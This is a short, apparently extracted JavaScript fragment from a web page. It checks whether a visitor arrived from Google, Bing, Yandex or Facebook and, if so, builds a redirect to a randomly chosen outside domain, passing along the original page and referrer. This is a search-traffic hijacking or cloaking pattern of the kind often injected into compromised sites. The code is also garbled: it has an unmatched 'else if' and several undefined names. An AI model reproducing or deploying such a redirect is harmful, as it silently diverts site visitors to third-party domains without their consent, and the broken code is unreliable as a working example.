//<![CDATA[
    if(document.referrer)
    {
        var cek = document.referrer;

        var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('facebook.');

      if(is_se)
        var ars             = rChoice([
                            "https://seoclick.org",
                            "https://sumba.club",
                            "https://oneorbit.xyz",
                            "https://chiarafans.club",
                            "https://aziekitchen.xyz",
                            "https://berita-islami.me",
                        ]);
                       


    var dir_type        = "arsae"; //refresh, domain, path, arsae

    else if(dir_type == 'arsae')
    {
        //==> ARSAE DIRECT
        go_current            = ars + '/?arsae='+ encodeURIComponent(go_current) + '&arsae_ref='+ encodeURIComponent(reff);
    }
    }
//]]>
 
